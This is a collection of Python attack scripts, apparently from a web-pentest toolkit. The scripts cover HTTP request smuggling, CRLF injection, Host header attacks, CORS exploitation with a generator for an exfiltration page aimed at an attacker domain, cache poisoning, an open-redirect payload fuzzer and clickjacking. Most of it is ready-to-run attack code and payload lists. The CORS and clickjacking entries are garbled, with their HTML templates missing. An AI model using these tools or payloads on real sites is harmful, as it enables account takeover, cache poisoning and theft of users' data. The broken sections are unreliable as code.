entries.title: HTTP request smuggling detector (CL.TE / TE.CL timing)
entries.body:
Finds front-end/back-end desync (HTTP/1.1) via a **differential delay**. It sends a poisoned request whose front end and back end count the body length differently: if the back end waits for more bytes, the response is delayed - that is a CL.TE or TE.CL signal. First a baseline for a normal request is measured, then it is compared with the payload timing. Confirmation via a repeat to filter out network jitter.

> This is only **timing-based detection** (safe). Exploitation (request queue, stealing other users' requests) is done manually via Burp Repeater or the HTTP Request Smuggler extension. For CL.0 (the back end ignores Content-Length on this endpoint) and 0.CL see the note below.
> Ready-made scanner: **smuggler** (defparam/smuggler, MIT) - can be installed separately: `git clone https://github.com/defparam/smuggler && python3 smuggler.py -u https://target/`.

```python
#!/usr/bin/env python3
# smuggle_timing_detector.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, socket, ssl, time, statistics

def send_raw(host, port, tls, raw, read_timeout):
    s = socket.create_connection((host, port), timeout=read_timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    t0 = time.time()
    s.sendall(raw)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            # the first response line is enough for timing
            if b"\r\n" in chunk:
                break
    except socket.timeout:
        pass
    dt = time.time() - t0
    s.close()
    return dt

def build(host, path, kind):
    # CL.TE: front end reads by Content-Length, back end by Transfer-Encoding
    if kind == "clte":
        body = "1\r\nA\r\n0\r\n\r\n"  # chunked: one byte, then the end
        hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
               "Transfer-Encoding: chunked\r\n"
               f"Content-Length: {len(body)+4}\r\n\r\n" + body)
        # CL is larger than the real body -> if the back end parses chunked and waits for more, it hangs
    elif kind == "tecl":
        body = "0\r\n\r\nX"  # chunked end + extra byte
        hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
               "Transfer-Encoding: chunked\r\n"
               f"Content-Length: {len(body)-1}\r\n\r\n" + body)
    else:  # baseline
        body = "x=1"
        hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\n\r\n" + body)
    return hdr.encode()

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL smuggling timing detector")
    ap.add_argument("-t", "--target", required=True, help="host[:port]")
    ap.add_argument("-p", "--path", default="/")
    ap.add_argument("--timeout", type=float, default=8.0, help="read timeout per request")
    a = ap.parse_args()
    host, _, p = a.target.partition(":")
    port = int(p) if p else 443
    tls = port == 443
    base = statistics.median([send_raw(host, port, tls, build(host, a.path, "base"), a.timeout) for _ in range(3)])
    print(f"[*] baseline = {base:.2f}s (timeout={a.timeout}s)")
    for kind, label in (("clte", "CL.TE"), ("tecl", "TE.CL")):
        dts = [send_raw(host, port, tls, build(host, a.path, kind), a.timeout) for _ in range(2)]
        d = min(dts)
        flag = " <== POSSIBLE DESYNC" if d >= base + a.timeout * 0.6 else ""
        print(f"    {label}: {d:.2f}s{flag}")

if __name__ == "__main__":
    main()
```

Note on CL.0 / 0.CL: on some endpoints (static files, redirects) the back end ignores the body entirely - then any `Content-Length` with an extra tail in the body turns into the start of the next request (CL.0). It is checked with the same raw socket: you send a `POST` with the body `GET /404page HTTP/1.1\r\nFoo: bar` and watch whether the content of 404page arrives in the response to the **next** keep-alive request.

Run:
```bash
python3 smuggle_timing_detector.py -t target.com:443 -p /api/login
```

entries.title: CRLF injection / header splitting probe
entries.body:
Checks whether you can **inject your own HTTP headers** through a parameter/path by smuggling `%0d%0a` (CR LF) into a value that the server places into a response header (often into a redirect `Location` or into `Set-Cookie`). If the injection succeeds - you can attach an arbitrary `Set-Cookie`, poison the cache, and sometimes escalate to XSS via the body. The script iterates over CRLF encodings (plain, double url-encode, and the GBK bypass `%E5%98%8D%E5%98%8A`) and checks whether our marker header appeared in the response.

> The GBK variant (`%E5%98%8D%E5%98%8A`) bypasses filters on servers where the upstream decodes a multibyte encoding and these bytes collapse into real CR/LF. The marker is searched specifically in the response headers (`r.headers`), not in the body.

```python
#!/usr/bin/env python3
# crlf_inject.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, requests
requests.packages.urllib3.disable_warnings()

MARKER = "arscrlf"
# each payload must smuggle in the header  X-ARS: <marker>  and Set-Cookie
PAYLOADS = [
    "%0d%0aX-ARS:{m}",
    "%0d%0aSet-Cookie:ars={m}",
    "%0aX-ARS:{m}",                  # LF only (some stacks accept it)
    "%23%0d%0aX-ARS:{m}",           # with a leading # for bypass
    "%E5%98%8D%E5%98%8AX-ARS:{m}",  # GBK overlong CR LF
    "%25%30%64%25%30%61X-ARS:{m}",  # double url-encode
    "%u000d%u000aX-ARS:{m}",        # IIS-style unicode
]

def test(url, payload):
    inj = payload.format(m=MARKER)
    target = url.replace("FUZZ", inj) if "FUZZ" in url else url + inj
    try:
        r = requests.get(target, allow_redirects=False, verify=False, timeout=15)
    except requests.RequestException:
        return None
    # marker in the value of any response header = injection succeeded
    joined = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
    hit_hdr = ("x-ars" in joined) or (MARKER in joined)
    return (r.status_code, hit_hdr, dict(r.headers))

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL CRLF injection probe")
    ap.add_argument("-u", "--url", required=True, help="URL with FUZZ at the injection point")
    a = ap.parse_args()
    print(f"[*] target: {a.url}")
    for p in PAYLOADS:
        res = test(a.url, p)
        if res is None:
            print(f"    [err] {p}")
            continue
        code, hit, _ = res
        tag = "VULN-CRLF" if hit else "ok"
        print(f"    [{code}] {tag:10s} {p}")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 crlf_inject.py -u "https://target/redirect?next=FUZZ"
```

entries.title: Host header attack tester (Host / X-Forwarded-Host / dual-Host)
entries.body:
Iterates over classic Host header attacks: spoofing `Host`, `X-Forwarded-Host`, `X-Host`, `Forwarded`, an absolute URI in the request line, and a **double Host header** (the front end reads the first, the back end the second). For each vector it checks whether **our domain is reflected** in the body/headers (links, redirects, password reset) - this is the path to password-reset poisoning and web-cache poisoning. Separately it checks reset-poison (domain in Location/body) and the cache (a repeat GET without the header - whether our domain came back = cache poisoned).

> To test SSRF/internal access via Host, substitute the DNS-rebind host `rbndr.us` (e.g. `7f000001.c0a80001.rbndr.us` - it alternates 127.0.0.1 and 192.168.0.1). EVIL must be a controlled domain or Burp Collaborator to catch out-of-band requests.

```python
#!/usr/bin/env python3
# host_header_tester.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, requests
requests.packages.urllib3.disable_warnings()

def show(label, r, evil):
    body_hit = evil in r.text
    loc = r.headers.get("Location", "")
    loc_hit = evil in loc
    tag = "REFLECTED" if (body_hit or loc_hit) else "-"
    where = ("body " if body_hit else "") + ("Location" if loc_hit else "")
    print(f"    [{r.status_code}] {tag:10s} {label:22s} {where}")

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL Host header tester")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-e", "--evil", required=True, help="controlled domain (Collaborator)")
    a = ap.parse_args()
    from urllib.parse import urlparse
    orig = urlparse(a.url).netloc
    s = requests.Session(); s.headers["User-Agent"] = "ARS3NAL/1.0"
    vectors = {
        "Host":              {"Host": a.evil},
        "X-Forwarded-Host":  {"Host": orig, "X-Forwarded-Host": a.evil},
        "X-Host":            {"Host": orig, "X-Host": a.evil},
        "X-Forwarded-Server":{"Host": orig, "X-Forwarded-Server": a.evil},
        "Forwarded":         {"Host": orig, "Forwarded": f"host={a.evil}"},
        "Host+port":         {"Host": f"{orig}:@{a.evil}"},
    }
    for label, h in vectors.items():
        try:
            r = s.get(a.url, headers=h, allow_redirects=False, verify=False, timeout=15)
        except requests.RequestException as e:
            print(f"    [err] {label}: {e}"); continue
        show(label, r, a.evil)
    # dual-Host (cannot be done via raw in requests, so we pass both values as a list in the string)
    try:
        r = s.get(a.url, headers={"Host": f"{orig}\r\nHost: {a.evil}"}, verify=False, timeout=15)
        show("dual-Host", r, a.evil)
    except requests.RequestException:
        print("    [skip] dual-Host (lib rejected CRLF in the header - check via Burp)")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 host_header_tester.py -u "https://target/forgot-password" -e "evil.collab.net"
```

entries.title: CORS misconfiguration tester + HTML exfil PoC generator
entries.body:
Checks whether the API trusts an arbitrary `Origin`. It sends a series of Origins (reflection of our domain, `null`, a subdomain, a **prefix** `target.com.evil.com`, a **suffix** `evil-target.com`) and inspects the pair `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true`. If ACAO reflects our Origin **and** ACAC=true - you can steal data with the victim's authorization. For each Origin that works, the script generates a **ready-made HTML exfiltration page** (fetch with credentials, sending the body to your server). > The most dangerous is `ACAO: ` together with `ACAC: true`. `ACAO: *` with credentials is forbidden by the browser (this is NOT a hole). `Origin: null` works from `sandbox` iframes / `data:` pages. ```python #!/usr/bin/env python3 # cors_poc_gen.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing. import argparse, requests requests.packages.urllib3.disable_warnings() def origins(target, evil): from urllib.parse import urlparse host = urlparse(target).netloc return { "reflect": f"https://{evil}", "null": "null", "prefix": f"https://{host}.{evil}", # target.com.evil.com "suffix": f"https://evil-{host}", # evil-target.com (if the regex is sloppy) "subdom": f"https://evil.{host}", "http": f"http://{evil}", # downgrade to http } HTML = '''

CORS PoC

loading...
''' def main(): ap = argparse.ArgumentParser(description="ARS3NAL CORS tester + PoC gen") ap.add_argument("-u", "--url", required=True) ap.add_argument("-e", "--evil", required=True, help="your domain for exfiltration") ap.add_argument("-o", "--out", default="cors_poc.html") a = ap.parse_args() vuln = None for name, origin in origins(a.url, a.evil).items(): try: r = requests.get(a.url, headers={"Origin": origin}, verify=False, timeout=15) except requests.RequestException: continue acao = r.headers.get("Access-Control-Allow-Origin", "") acac = r.headers.get("Access-Control-Allow-Credentials", "").lower() == "true" ok = (acao == origin) or (acao == "null" and origin == "null") sev = "HIGH" if (ok and acac) else ("MED" if ok else "-") print(f" [{sev:4s}] {name:8s} Origin={origin} ACAO={acao!r} ACAC={acac}") if ok and vuln is None: vuln = origin if vuln is not None: with open(a.out, "w", encoding="utf-8") as f: f.write(HTML.format(target=a.url, evil=a.evil)) print(f"[+] PoC written: {a.out} (open as https://{a.evil}/{a.out})") else: print("[-] reflected-CORS not confirmed") if __name__ == "__main__": main() ``` Run: ```bash python3 cors_poc_gen.py -u "https://target/api/account" -e "evil.com" ```

entries.title: Web cache poisoning probe (unkeyed headers, fat-GET)
entries.body:
Looks for **inputs that are not part of the cache key (unkeyed)** that can be used to poison the cache. Algorithm: we add a unique cache-buster to the URL, send a request with a suspicious header (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Host`, etc.), then make a **clean** repeat request to the same URL. If our marker came back in the clean response - the header is not part of the cache key but affects the response = poisoning. Additionally it tries a **fat-GET** (a body on a GET request) and inspects the `X-Cache`/`Age`/`CF-Cache-Status` headers to confirm a HIT.

> Always work with **your own** cache-buster (`?cb=...`) so you do not poison the cache for real users. `X-Cache: HIT` or a growing `Age` confirm that the response is cached.

```python
#!/usr/bin/env python3
# cache_poison_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, requests, time, uuid
requests.packages.urllib3.disable_warnings()

UNKEYED = ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto",
           "X-Original-URL", "X-Rewrite-URL", "X-Host", "X-Forwarded-Server"]

def cache_status(r):
    for h in ("X-Cache", "CF-Cache-Status", "X-Cache-Status", "Age", "X-Drupal-Cache"):
        if h in r.headers:
            return f"{h}={r.headers[h]}"
    return "?"

def probe(url, header, evil):
    cb = uuid.uuid4().hex[:8]
    u = url + ("&" if "?" in url else "?") + "cb=" + cb
    try:
        requests.get(u, headers={header: evil}, verify=False, timeout=15)
        time.sleep(0.4)
        clean = requests.get(u, verify=False, timeout=15)  # without the header
    except requests.RequestException:
        return None
    return (evil in clean.text, cache_status(clean))

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL web cache poisoning probe")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-e", "--evil", default="ars-cache.evil.com")
    a = ap.parse_args()
    print(f"[*] target: {a.url}  marker={a.evil}")
    for h in UNKEYED:
        res = probe(a.url, h, a.evil)
        if res is None:
            print(f"    [err]  {h}"); continue
        poisoned, cs = res
        tag = "POISONED" if poisoned else "-"
        print(f"    [{tag:8s}] {h:22s} {cs}")
    # fat-GET
    try:
        cb = uuid.uuid4().hex[:8]
        u = a.url + ("&" if "?" in a.url else "?") + "cb=" + cb
        r = requests.request("GET", u, data=f"x={a.evil}", verify=False, timeout=15)
        print(f"    [fat-GET] body-GET accepted={r.status_code}  {cache_status(r)}")
    except requests.RequestException:
        pass

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 cache_poison_probe.py -u "https://target/en/" -e "ars.evil.com"
```

entries.title: Open redirect fuzzer (25 bypass payloads)
entries.body:
Iterates over **25 bypasses** for open-redirect filters: a bare domain, `//evil`, `https:evil`, `\/\/evil`, the `@`-trick (`target.com@evil`), backslashes, `%2f%2f`, `%5c`, a unicode dot, whitelist bypass via subdomain/suffix, `data:`, `javascript:`, etc. For each payload it inspects the `Location` header (or meta-refresh/JS in the body) and determines whether it **sent us to a foreign domain**. Open redirect on its own is low, but it is a frequent multiplier: OAuth `redirect_uri` bypass, a chain to SSRF, phishing from a trusted domain.

> The script does NOT follow the redirect (allow_redirects=False) - it only checks where the server PROPOSES to go. EVIL must be a domain that is definitely not in the target's whitelist.

```python
#!/usr/bin/env python3
# open_redirect_fuzz.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

def payloads(evil):
    return [
        evil, f"//{evil}", f"///{evil}", f"////{evil}",
        f"https://{evil}", f"http://{evil}", f"https:{evil}", f"https:/{evil}",
        f"\\\\{evil}", f"\\/\\/{evil}", f"/\\{evil}", f"/%2f{evil}",
        f"%2f%2f{evil}", f"%5c%5c{evil}", f"%09//{evil}",
        f"https://target.com@{evil}", f"https://target.com%40{evil}",
        f"https://{evil}%23.target.com", f"https://{evil}#.target.com",
        f"https://{evil}%2f.target.com", f"https://{evil}?.target.com",
        f"https://target.com.{evil}", f"https://{evil}\u3002target.com",
        f"data:text/html,<script>location='https://{evil}'</script>",
        f"java%0d%0ascript:alert(1)//{evil}",
    ]

def offsite(location, evil):
    if not location:
        return False
    try:
        host = urlparse(location if "//" in location else "//" + location, scheme="http").netloc
    except ValueError:
        return evil in location
    return host.endswith(evil) or evil in host

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL open redirect fuzzer")
    ap.add_argument("-u", "--url", required=True, help="URL with FUZZ in the redirect parameter value")
    ap.add_argument("-e", "--evil", default="evil.example")
    a = ap.parse_args()
    print(f"[*] target: {a.url}")
    for p in payloads(a.evil):
        target = a.url.replace("FUZZ", requests.utils.quote(p, safe="")) if "FUZZ" in a.url else a.url + p
        try:
            r = requests.get(target, allow_redirects=False, verify=False, timeout=15)
        except requests.RequestException:
            print(f"    [err]  {p}"); continue
        loc = r.headers.get("Location", "")
        hit = offsite(loc, a.evil) or (a.evil in r.text and "location" in r.text.lower())
        tag = "OPEN-REDIR" if hit else "-"
        print(f"    [{r.status_code}] {tag:10s} {p[:40]:40s} -> {loc[:50]}")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 open_redirect_fuzz.py -u "https://target/login?next=FUZZ" -e "evil.example"
```

entries.title: Clickjacking PoC page (iframe overlay)
entries.body:
A ready-made HTML page to demonstrate clickjacking: the target site is loaded in a semi-transparent `iframe` over a lure. If the target page **does not forbid framing** (no `X-Frame-Options: DENY/SAMEORIGIN` and no `Content-Security-Policy: frame-ancestors`), the iframe renders - and the 'Click me' button ends up exactly over a dangerous action on the target (password change, transfer, deletion). The underlay `opacity` is controlled by a slider: for a report set 1.0 (the swap is visible), for a 'live' PoC - 0.0. > Before writing the report, check the headers: `curl -sI {{URL}} | grep -iE 'x-frame-options|content-security-policy'`. If `frame-ancestors`/`DENY` is present - framing is blocked, this is NOT a bug. ```html Clickjacking PoC

You won! Claim your prize:

opacity:
``` Run: substitute the target URL in place of `TARGET_URL`, save as `clickjacking_poc.html`, open it in a browser. If you see the target page through the lure - framing is allowed. ```bash # check the protective headers: curl -sI "https://target/account/settings" | grep -iE 'x-frame-options|frame-ancestors' ```
